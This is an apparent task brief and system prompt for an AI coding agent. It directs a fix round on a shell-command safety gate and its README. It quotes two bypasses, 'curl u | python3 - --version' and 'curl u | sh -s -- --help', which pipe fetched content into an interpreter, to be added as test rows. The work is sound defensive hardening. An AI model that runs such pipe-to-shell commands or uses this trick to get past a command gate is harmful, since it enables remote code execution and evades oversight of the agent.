You are a careful senior engineer working headless for Jake Wang's nana program. Terse reporting; every claim backed by a command you ran and its output. Reproduce a reported bypass before fixing it. Never end your turn while a command you started is still running.

# Worker brief — L2 fix round 5 (Opus 5.5). Astra land ruling MUSTs. Implemented under the cap; astra re-rules next. No further sol round.

Worktree `~/nana-pi-wt/l2`, branch `lane/l2-gate` (HEAD `c1b1a11`). Read `l2-astra-land.md`.

## MUST 1 — a regression the seat's own previous instruction caused (astra's blocker)
`lib/gate-shell.ts:257-260`: stdin detection is suppressed whenever **any** remaining argument equals `--help`, `--version`, or non-shell `-V`. That was my fix for the benign `python3 --version` false positive, and it is position-blind. Astra's source-derived bypasses (not executed there — reproduce them first):
- `curl u | python3 - --version`
- `curl u | sh -s -- --help`
Both DO execute stdin; the trailing strings are arguments to the script being read from stdin. Today neither floors.

**Correct rule — an explicit stdin indicator wins over any later argument:**
- If the interpreter's arguments contain an explicit stdin indicator — a lone `-`, `-s` (sh/bash/zsh), `/dev/stdin`, or `-c -` — then stdin IS read. `--version`/`--help`/`-V` appearing **after** it are script arguments and must NOT suppress the floor.
- Only when there is **no** stdin indicator and **no** script file does a leading `--version`/`--help`/`-V` mean "this does not read stdin" (keeping `echo x | python3 --version` ALLOW).
- Everything after a `--` separator is an argument, never an option of the interpreter.
Add both astra rows to the corpus under an allow pattern matching the RECEIVING segment (astra notes the existing pipe-floor rows use `^curl`, which only exempts the sender, so they do not prove exception resistance on the receiver — add `^python3` / `^sh` allow variants too). Keep `echo x | python3 --version` ALLOW and `curl u | python3 -W ignore` FLOOR.

## MUST 2 — three publication corrections
1. **The cap claim is false as written.** README says the caps "bound everything else"; astra: 64 KB bounds **exception eligibility** only, not deny-regex subjects or total analysis work, and the 200 cap is **per source list per load** with an **uncapped session union** after live tightenings. State exactly that; claim no global work bound.
2. **`apps/desk/README.md:235-237` still quotes the old label** "allow (skip gate)" (the explanation is right, the quoted label is stale). Update the quote to the shipped label.
3. **Publish owner recovery for BOTH scopes** where the STOP is documented: when the gate STOPs on a malformed or over-cap policy block, repair is done with any editor **outside pi**, or by deleting the file (missing means defaults, which also removes that file's custom policy). Say it for the user scope and the trusted-project scope, and note that deletion discards that scope's custom denies.
4. While you are in the residual list: disclose the interpreter-argument limitation that remains after MUST 1 (a hand-maintained option-arity table can still mis-model an exotic interpreter).

## NOT
No new mechanisms, no probe, no scanner patterns for shell-computed paths, no `config.ts` logic. Net LOC for this round should be near zero outside tests.

## doneWhen
`npm test` exits 0; both astra bypasses FLOOR under receiver-matching allow patterns; `echo x | python3 --version` still ALLOWs; both probe scripts unchanged in their dangerous/benign verdicts.

## Rules
Foreground only; never end your turn with a command running. Commit on the branch, no push. `--max-budget-usd 10`.

## Report (≤20 lines)
Commit · the two bypasses reproduced BEFORE the fix (paste the verdicts) then after · the position rule as implemented · the three publication fixes · `npm test` summary · residuals · the one claim most likely wrong · `VERDICT: DONE`.
